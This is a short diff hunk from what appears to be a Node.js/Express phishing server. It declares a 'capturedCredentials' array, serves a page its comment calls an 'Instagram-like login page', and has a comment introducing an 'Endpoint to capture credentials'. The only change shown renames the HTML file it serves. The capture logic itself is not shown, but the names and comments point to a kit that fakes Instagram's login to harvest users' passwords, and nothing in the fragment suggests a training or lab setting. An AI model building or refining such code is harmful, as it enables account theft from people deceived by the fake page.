@@ -12,7 +12,7 @@ const capturedCredentials = [];
 
 // Serve the Instagram-like login page
 app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/index_01.html");
+  res.sendFile(__dirname + "/index.html");
 });
 
 // Endpoint to capture credentials
